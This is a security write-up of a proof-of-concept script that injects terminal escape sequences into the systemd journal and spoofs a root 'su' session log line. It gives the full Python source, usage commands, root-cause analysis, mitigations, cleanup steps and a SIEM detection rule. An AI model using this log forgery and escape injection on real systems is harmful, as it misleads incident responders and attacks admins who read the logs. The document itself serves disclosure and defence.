JournalCTL Terminal Escape Injection & Log-Source Spoofing

Interactive report on journalctl_poc.py — a local, non-destructive proof of concept showing how any unprivileged user can inject terminal escape sequences into the systemd journal and spoof the apparent source of a log line, weaponized the moment an admin runs journalctl -a.

Technique: Tyler Borland (2014)  ·  PoC: journalctl_poc.py  ·  Scope: your own machine only

What this PoC demonstrates

The systemd journal accepts datagrams on /run/systemd/journal/socket from any local user and stores the MESSAGE= field verbatim — control bytes and all. When an administrator later views the journal with journalctl -a, the pager emits those raw bytes into an interactive terminal, which interprets embedded escape sequences. The PoC demonstrates both primitives:

(a) Terminal escape injection

A stored log line carries an OSC 0 escape sequence (ESC ] 2 ; … BEL). Inert in storage — but when the reader pages the journal with -a, their terminal executes it: window-title hijack, and by extension any sequence the terminal honours.

(b) Log-source spoofing

The reader cannot tell where a hand-crafted datagram really came from. The PoC renames its own process via prctl(PR_SET_NAME) to su, so _COMM=su and the forged line reads like a genuine pam_unix root session-open event.

Why it matters

  • Logs are a trust boundary. Incident responders treat journal output as ground truth; this PoC shows it can lie about who did what.
  • The viewer is the victim. The payload is dormant until a privileged user reads the logs — a classic "watering hole in the log file" pattern.
  • Escape injection is more than cosmetic. Title-bar flips are the harmless demo; the same channel can carry sequences for colour/sprite trickery, clipboard (OSC 52) on some terminals, or worse on legacy emulators.
Safety: this PoC is local-only, unprivileged, and non-destructive. It writes two log lines to your own machine's journal and stops. Cleanup instructions are in §06.

Root cause analysis

Three design facts combine into the vulnerability:

1

World-writable journal socket

/run/systemd/journal/socket is an AF_UNIX SOCK_DGRAM socket that any local user can send() to — no authentication, no group gate.

2

Verbatim storage

journald stores MESSAGE= exactly as received. Newlines, ESC (0x1b), BEL (0x07) — all persisted. There is no sanitisation layer at ingestion.

3

Raw emission on view

journalctl -a ("show all fields, unprintable included") writes stored bytes straight to the pager/stdout. On an interactive terminal, escape bytes are executed, not displayed.

The two payloads, byte by byte

PayloadBytesEffect
(a) OSC title set MESSAGE=\x1b]2;POC ESCAPE INJECTION\x07\x0a When displayed with -a: terminal sets its window title to POC ESCAPE INJECTION.
(b) pam spoof MESSAGE=pam_unix(su:session): session opened for user root by person_we_setup(uid=1003) Combined with _COMM=su, indistinguishable at a glance from a real root su event.
How does the process-name spoof work?

journald enriches each incoming datagram with trusted-looking metadata (_COMM, _PID, _UID…) read from the sender's credentials. _COMM comes from the process name — which any process can change for itself with prctl(PR_SET_NAME, "su") (15 chars max). So while _UID=1003 still truthfully identifies the sender, the human eye lands on su[pid]: and the forged pam_unix text — exactly what the original 2014 PoC exploited.

The PoC — annotated

Full source of journalctl_poc.py. Key mechanisms are highlighted; use the copy button to grab it.

journalctl_poc.py 
#!/usr/bin/env python3
"""Local PoC — JournalCTL Terminal Escape Injection / log-injection (Tyler Borland, 2014)."""

import os, sys, time, socket
import ctypes

SOCKET = "/run/systemd/journal/socket"  # DGRAM, writable by ANY local user

def set_proc_name(name: str) -> bool:
    # prctl(PR_SET_NAME) — max 15 chars + NUL. This is what _COMM reports.
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    buf = ctypes.create_string_buffer(name.encode()[:15] + b"\x00")
    libc.prctl(15, ctypes.byref(buf), 0, 0, 0)  # 15 == PR_SET_NAME

def send(payload: bytes, label: str) -> None:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    s.connect_ex(SOCKET); time.sleep(0.2); s.send(payload); s.close()

# (a) OSC 0 "set window title" + BEL — inert without -a, EXECUTED with -a
send(b"MESSAGE=\x1b]2;POC ESCAPE INJECTION\x07\x0a", "escape-injection")

# (b) comm → "su", then a message that reads like a real pam session-open
set_proc_name("su")
send(b"MESSAGE=pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)\n",
     "log-spoof")

Usage

python3 journalctl_poc.py            # inject both (a) and (b)
python3 journalctl_poc.py --escape   # only terminal escape injection
python3 journalctl_poc.py --spoof    # only log-source spoof (incl. comm rename)
Line-by-line: where the magic happens
  • socket.AF_UNIX, socket.SOCK_DGRAM — a connectionless local datagram to journald. No privileges, no handshake.
  • MESSAGE=\x1b]2;…\x07 — \x1b] opens an OSC sequence, 2; selects "set window title", \x07 (BEL) terminates it.
  • prctl(15, …) — renames /proc/self/comm; journald then stamps _COMM=su on the next datagram.
  • time.sleep(0.2) — ensures ordering so the rename lands before the spoofed line is stamped.

Observe the result

# where an admin would get bitten — the title bar flips as the escape fires:
journalctl -a --no-pager | tail -5

# the spoofed line, complete with _COMM=su:
journalctl --no-pager | grep person_we_setup
# → Aug .. host su[pid]: pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)
Tell-tale sign for defenders: cross-check _COMM against _UID/_EXE/_CMDLINE. A line claiming su[pid]: whose _UID=1003 and _EXE=/usr/bin/python3 is forged. Use journalctl -o verbose to see all trusted fields.

Cleanup (needs root)

sudo journalctl --rotate && sudo journalctl --vacuum-time=1s

Rotates the active journal file into an archive and immediately vacuums it, removing the injected lines.

Verification checklist

  • PoC ran unprivileged, printed [+] injected … twice
  • journalctl -a triggered the title change (escape fired)
  • Spoofed line visible with _COMM=su but real _UID
  • Journal rotated & vacuumed; injected lines confirmed gone

Mitigations & hardening

For log readers (admins)

  • Prefer journalctl without -a on interactive terminals — default output elides unprintable bytes.
  • Pipe through a sanitiser when in doubt: journalctl | cat -v or less -R discipline.
  • Correlate with trusted fields (-o verbose): _UID, _EXE, _CMDLINE, _AUDIT_* don't lie as easily as _COMM.

For system owners

  • Keep systemd current — modern journald caps/sanitises more aggressively than 2014-era builds.
  • Forward journals to a remote, append-only collector (systemd-journal-remote / syslog) so local forgery is visible in context and local cleanup can't erase history.
  • Alert on pam_unix(su:session) lines whose _UID ≠ 0 and whose _EXE isn't su.
  • Restrict who can even reach the box: this class needs local execution.

Detection idea (SIEM rule sketch)

# flag journal entries where the claimed subsystem and the metadata disagree
WHERE message MATCHES "pam_unix(su:session).*session opened"
  AND (_COMM != "su" OR _UID >= 1000 OR _EXE NOT ENDSWITH "/su")
ALERT  "Possible journal log-spoof (escape-injection class)"
